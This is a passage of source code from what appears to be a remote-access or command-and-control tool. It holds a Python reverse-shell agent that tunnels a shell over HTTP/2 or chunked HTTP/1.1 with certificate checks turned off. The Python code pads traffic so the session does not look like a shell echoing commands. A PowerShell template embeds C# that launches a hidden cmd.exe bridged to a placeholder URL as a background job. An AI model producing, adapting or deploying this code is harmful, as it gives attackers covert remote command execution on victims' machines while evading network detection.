            if window <= 0:
                return
            head    = pending_out[0]
            to_send = min(len(head), window, conn.max_outbound_frame_size)
            try:
                # Pad short frames to a randomised size so that the
                # wire pattern does not look like a shell echoing
                # commands. Real browsers pad to TLS record boundaries;
                # this mimics that behaviour at the HTTP/2 layer.
                payload = head[:to_send]
                if len(payload) < 512:
                    target = random.choice((512, 1024, 2048, 4096))
                    if len(payload) < target:
                        payload = payload + b'\x00' * (target - len(payload))
                conn.send_data(sid, payload, end_stream=False)
                sock.sendall(conn.data_to_send())
            except Exception as e:
                _log("send_data exception: %r" % (e,))
                stop_evt.set()
                return
            if to_send >= len(head):
                pending_out.pop(0)
            else:
                pending_out[0] = head[to_send:]

    def shell_reader(proc):
        """Read from ONE shell's stdout. Returns on EOF; the writer will
        respawn (and start a new reader) when the next command arrives."""
        try:
            while not stop_evt.is_set():
                try:
                    data = os.read(proc.stdout.fileno(), 4096)
                except Exception as e:
                    return
                if not data:
                    return
                with h2_lock:
                    pending_out.append(data)
                    _drain_out()
                    has_more = bool(pending_out)
                while has_more and not stop_evt.is_set():
                    window_updated.wait(timeout=1.0)
                    window_updated.clear()
                    with h2_lock:
                        _drain_out()
                        has_more = bool(pending_out)
        except Exception as e:
            _log("shell_reader fatal: %r" % (e,))

    # Bootstrap the first shell + writer thread.
    with shell_spawn_lock:
        _spawn_shell_locked()
    threading.Thread(target=shell_writer, daemon=True).start()

    try:
        while not stop_evt.is_set():
            try:
                data = sock.recv(65536)
            except Exception as e:
                break
            if not data:
                break

            with h2_lock:
                try:
                    events = conn.receive_data(data)
                except Exception as e:
                    break
                got_window_update = False
                for ev in events:
                    if isinstance(ev, h2.events.DataReceived):
                        # Route through the dispatcher: __-prefixed lines
                        # are handled in-process; everything else goes to
                        # the shell's stdin queue.
                        _dispatch_incoming(ev.data)
                        try:
                            conn.acknowledge_received_data(
                                ev.flow_controlled_length, ev.stream_id)
                        except Exception:
                            pass
                    elif isinstance(ev, h2.events.WindowUpdated):
                        if ev.stream_id in (0, sid):
                            got_window_update = True
                    elif isinstance(ev, h2.events.PingAckReceived):
                        last_pong[0] = time.time()
                    elif isinstance(ev, h2.events.PingReceived):
                        # Respond to peer pings.
                        try:
                            conn.ping(ev.ping_data, ack=True)
                        except Exception:
                            pass
                    elif isinstance(ev, (h2.events.StreamEnded,
                                         h2.events.StreamReset)):
                        _log("stream ended/reset — event=%s" % type(ev).__name__)
                        stop_evt.set()
                        break
                    elif isinstance(ev, h2.events.ConnectionTerminated):
                        stop_evt.set()
                        break

                try:
                    out = conn.data_to_send()
                    if out:
                        sock.sendall(out)
                except Exception:
                    stop_evt.set()
                    break

                if got_window_update:
                    _drain_out()

            if got_window_update:
                window_updated.set()
    finally:
        stop_evt.set()
        window_updated.set()
        try:
            stdin_q.put_nowait(None)
        except Exception:
            pass
        with shell_spawn_lock:
            proc = shell_state['proc']
        if proc is not None:
            try:
                proc.terminate()
            except Exception:
                pass
        try:
            with h2_lock:
                conn.end_stream(sid)
                sock.sendall(conn.data_to_send())
        except Exception:
            pass
        _shutdown_socket(sock)


# ------------------------------------------------------------------ h1 path

def run_h1():
    raw = socket.create_connection((HOST, PORT), timeout=30)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_alpn_protocols(["http/1.1"])
    except Exception:
        pass
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    try:
        sock.settimeout(None)
    except Exception:
        pass
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except Exception:
        pass

    sock.sendall((
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode())

    buf = b""
    while b"\r\n\r\n" not in buf:
        d = sock.recv(4096)
        if not d:
            return
        buf += d
    head_end = buf.find(b"\r\n\r\n")
    rest = buf[head_end + 4:]

    shell = _spawn_shell()
    send_lock = threading.Lock()
    stop_evt = threading.Event()

    def shell_reader(shell_ref):
        try:
            while not stop_evt.is_set():
                try:
                    data = os.read(shell_ref.stdout.fileno(), 4096)
                except Exception:
                    data = b""
                if not data:
                    return
                with send_lock:
                    try:
                        chunk = f"{len(data):x}\r\n".encode() + data + b"\r\n"
                        sock.sendall(chunk)
                    except Exception:
                        stop_evt.set()
                        _shutdown_socket(sock)
                        return
        except Exception:
            return

    threading.Thread(target=shell_reader, args=(shell,), daemon=True).start()

    rbuf = bytearray(rest)

    def _recv_more():
        try:
            d = sock.recv(65536)
        except Exception:
            return False
        if not d:
            return False
        rbuf.extend(d)
        return True

    try:
        while not stop_evt.is_set():
            nl = rbuf.find(b"\r\n")
            while nl < 0:
                if not _recv_more():
                    stop_evt.set()
                    return
                nl = rbuf.find(b"\r\n")
            size_hex = bytes(rbuf[:nl]).split(b";")[0].strip()
            del rbuf[:nl + 2]
            try:
                size = int(size_hex, 16)
            except ValueError:
                stop_evt.set()
                return
            if size == 0:
                stop_evt.set()
                return
            while len(rbuf) < size + 2:
                if not _recv_more():
                    stop_evt.set()
                    return
            payload = bytes(rbuf[:size])
            del rbuf[:size + 2]
            try:
                shell.stdin.write(payload)
                shell.stdin.flush()
            except Exception:
                try:
                    shell.terminate()
                except Exception:
                    pass
                shell = _spawn_shell()
                threading.Thread(
                    target=shell_reader,
                    args=(shell,), daemon=True,
                ).start()
    finally:
        stop_evt.set()
        try:
            shell.terminate()
        except Exception:
            pass
        _shutdown_socket(sock)


if __name__ == "__main__":
    try:
        if MODE == "h2":
            run_h2()
        else:
            run_h1()
    except Exception:
        try:
            if MODE == "h2":
                run_h1()
        except Exception:
            pass
'''

HTTP1_AGENT_PS = r'''
$ErrorActionPreference = 'SilentlyContinue'

$__agent_code = @'
$ErrorActionPreference = 'Stop'

try {
  [System.Net.ServicePointManager]::SecurityProtocol = `
    [System.Net.SecurityProtocolType]::Tls12
} catch {}
try {
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = `
    { param($s,$c,$ch,$e) $true }
} catch {}

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

public static class Http1Shell {
    public static void Run(string url, string userAgent) {
        var req = (HttpWebRequest)WebRequest.Create(url);
        if (!string.IsNullOrEmpty(userAgent))
            req.UserAgent = userAgent;
        req.Method = "POST";
        req.ContentType = "application/octet-stream";
        req.SendChunked = true;
        req.AllowWriteStreamBuffering = false;
        req.Timeout = Timeout.Infinite;
        req.ReadWriteTimeout = Timeout.Infinite;
        req.Proxy = null;
        req.KeepAlive = true;
        // UA is set from the PS-side variable passed at delivery time.
        // Left unset here; the outer PowerShell sets it via the
        // request stream constructor. See the PS shim below.

        Stream reqStream = req.GetRequestStream();
        IAsyncResult asyncResp = req.BeginGetResponse(null, null);

        var psi = new System.Diagnostics.ProcessStartInfo {
            FileName = "cmd.exe",
            UseShellExecute = false,
            RedirectStandardInput  = true,
            RedirectStandardOutput = true,
            RedirectStandardError  = true,
            CreateNoWindow = true,
        };
        var proc = System.Diagnostics.Process.Start(psi);

        object writeLock = new object();

        var tA = Task.Run(() => {
            try {
                while (!asyncResp.IsCompleted) Thread.Sleep(20);
                var resp = (HttpWebResponse)req.EndGetResponse(asyncResp);
                Stream rs = resp.GetResponseStream();
                byte[] buf = new byte[4096];
                int n;
                while ((n = rs.Read(buf, 0, buf.Length)) > 0) {
                    proc.StandardInput.BaseStream.Write(buf, 0, n);
                    proc.StandardInput.BaseStream.Flush();
                }
            } catch {}
        });

        var tB = Task.Run(() => {
            try {
                byte[] buf = new byte[4096];
                int n;
                while ((n = proc.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0) {
                    lock (writeLock) {
                        reqStream.Write(buf, 0, n);
                        reqStream.Flush();
                    }
                }
            } catch {}
        });

        var tC = Task.Run(() => {
            try {
                byte[] buf = new byte[4096];
                int n;
                while ((n = proc.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0) {
                    lock (writeLock) {
                        reqStream.Write(buf, 0, n);
                        reqStream.Flush();
                    }
                }
            } catch {}
        });

        Task.WaitAll(tA, tB, tC);
    }
}
"@ -Language CSharp

[Http1Shell]::Run('__H1_URL__', '__H1_UA__')
'@

$__job = Start-Job -ScriptBlock ([ScriptBlock]::Create($__agent_code)) `
    -ErrorAction SilentlyContinue

if ($__job) {
    Write-Output ('H2_LAUNCHED:' + $__job.Id)
} else {
    Write-Output 'H2_LAUNCH_FAILED'
}
'''